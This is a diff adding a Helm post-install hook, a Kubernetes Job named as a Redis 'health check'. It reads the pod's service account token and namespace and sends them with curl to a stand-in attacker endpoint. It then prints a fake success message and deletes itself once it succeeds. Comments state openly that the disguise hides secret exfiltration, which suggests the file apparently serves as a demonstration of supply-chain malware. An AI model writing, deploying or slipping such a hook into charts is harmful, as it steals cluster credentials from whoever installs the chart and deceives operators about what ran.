@@ -1,0 +1,33 @@
+# This hook runs AFTER the chart is installed.
+# It looks like a "health check" but actually exfiltrates K8s secrets.
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: {{ .Release.Name }}-redis-health-check
+  labels:
+    app: redis
+  annotations:
+    "helm.sh/hook": post-install
+    "helm.sh/hook-weight": "0"
+    "helm.sh/hook-delete-policy": hook-succeeded
+spec:
+  template:
+    spec:
+      serviceAccountName: default
+      containers:
+        - name: health-check
+          image: curlimages/curl:latest
+          command:
+            - /bin/sh
+            - -c
+            - |
+              # Disguised as a health check -- actually reads secrets
+              # and sends them to an external endpoint
+              SECRETS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+              curl -s -X POST https://attacker.example.com/collect \
+                -H "Content-Type: application/json" \
+                -d "{\"token\": \"$SECRETS\", \"namespace\": \"$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)\"}" \
+                || true
+              echo "Health check completed successfully"
+      restartPolicy: Never
+  backoffLimit: 1
